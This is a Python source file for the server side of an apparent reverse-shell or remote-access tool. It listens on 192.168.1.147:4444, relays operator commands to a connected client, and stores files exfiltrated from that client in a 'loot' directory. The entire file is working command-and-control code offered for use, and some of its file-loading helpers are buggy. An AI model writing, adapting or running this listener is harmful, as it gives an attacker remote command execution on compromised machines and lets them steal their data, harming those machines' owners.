#!/usr/bin/env python

import socket
import multiprocessing
import threading
import sys
from threading import Event
from threading import Thread
import queue
import time
import input_output
import os
import base64
import json
import subprocess

import command

class Server:
    def __init__(self, host, port):
        self.host, self.port = host, port

        self.EXIT_COMMAND = 'exit server\n'
        self.REBOOT_COMMAND = 'reboot server\n'
        self.EMPTY_BYTE = b''
        self.PATH_LOOT = os.getcwd() + '/loot/'
        self.thread_read_name = 'read_thread'
        self.thread_write_name = 'write_thread'
        self.time_out = 3.0

        self.cli_queue = queue.Queue()
        self.buffer = str()
        self.threads = list()
        self.handle_io_lock = threading.Lock()
        self.interrupt = threading.Event()

        self.standard_stream = input_output.CustomStandardStream(
            thread_read_name = self.thread_read_name,
            thread_write_name = self.thread_write_name,
        )
    
    def _read_client(self, client_socket):
        client_socket.settimeout( self.time_out )
        while self.buffer != self.REBOOT_COMMAND and self.buffer != self.EXIT_COMMAND:
            try:
                read = client_socket.recv(1024)
                assert read != self.EMPTY_BYTE, ConnectionError()

                # TODO command patron
                
                if self.buffer.split(' ')[0] == 'download':
                    name_file = self.buffer.split(' ')[1].rstrip()

                    receiver = command.Receiver()

                    command1 = command.DownloadFileCommand(receiver)

                    invoker = command.Invoker()
                    invoker.register('DownloadFileCommand', command1)

                    invoker.execute('DownloadFileCommand', path=self.PATH_LOOT + name_file, content=read)

                    #self.download_file(self.PATH_LOOT + name_file, content=read)
                    self.handle_io_lock.acquire()
                    self.standard_stream.handle_io(thread_name=threading.current_thread().name, notify='Download succesful!')
                    self.handle_io_lock.release()
                    continue

                read = read.decode()
                self.handle_io_lock.acquire()
                self.standard_stream.handle_io(thread_name=threading.current_thread().name, notify=read)
                self.handle_io_lock.release()

            except AssertionError:
                sys.stdout.write(f'\r[-] Connection broken, likely from client side. Rebooting Server...')
                self.cli_queue.put(self.REBOOT_COMMAND)
                break
            except socket.timeout as e:
                pass
            except Exception as e:
                print(e.with_traceback())
                pass

        client_socket.close()
                

    def _write_client(self, client_socket):

        while self.buffer != self.REBOOT_COMMAND and self.buffer != self.EXIT_COMMAND:

            #self.handle_io_lock.acquire()
            command = self.standard_stream.handle_io(thread_name=threading.current_thread().name, notify=client_socket.getpeername())                   
            #self.handle_io_lock.release()                

            self.cli_queue.put(command)
    
            if self.cli_queue.qsize() > 0:   
                self.buffer = self.cli_queue.get()
                client_socket.sendall(bytes(self.buffer, encoding='utf8'))

        client_socket.close() 

    
    def download_file(self, path, content):
        # TODO refractor
        try:
            with open(path, 'wb') as fd:
                return fd.write(content)
        except OSError:
            os.mkdir(self.PATH_LOOT)
            self.download_file(path, content)

    def load_file(self, file):
        with open(file, 'rb') as fd:
            return fd.read(file)


    def download_img(self, path, content):
        with open(path, 'wb') as fd:
            return fd.write( base64.b64decode(content) )
            

    def load_img(self, file):
        with open(file, 'rb') as fd:
            return base64.b64encode( fd.read(file) )

    def start(self):
        wait_threads = lambda list_thread: [thread.join() for thread in list_thread]
        while self.buffer != self.EXIT_COMMAND:

            self.server = socket.create_server(
                (self.host, self.port), reuse_port=True,
            )

            print(f'[+] Server {self.server.getsockname()} listening...')
            client_socket, client_addr = self.server.accept()
            print(f'[+] Connected to {client_socket.getpeername()} ')

            read_thread = threading.Thread(
                target = self._read_client, args = (client_socket,), 
                name = self.thread_read_name,
                daemon = True, 
                )

            write_thread = threading.Thread(
                target = self._write_client, args = (client_socket,), 
                name = self.thread_write_name,
                daemon = True, 
                )

            self.threads.append(read_thread)
            self.threads.append(write_thread)
            
            read_thread.start()
            write_thread.start()
       
            wait_threads(self.threads)

            if self.buffer == self.REBOOT_COMMAND:
                self._stop_threads()
                self.close_server()

        self.close_server()

    def _stop_threads(self):
        for thread in self.threads:            
            if (thread.is_alive()):
                self.cli_queue.put(self.EXIT_COMMAND)

    def close_server(self):
        self.server.close()
        self._stop_threads()
        self.cli_queue.queue.clear()
        self.buffer = None
        print(f'[+] Server closed succesfully...')
    
server = Server('192.168.1.147', 4444)

try:
    server.start()
except Exception as e:
    server.close_server()
    exit(-1)
exit(0)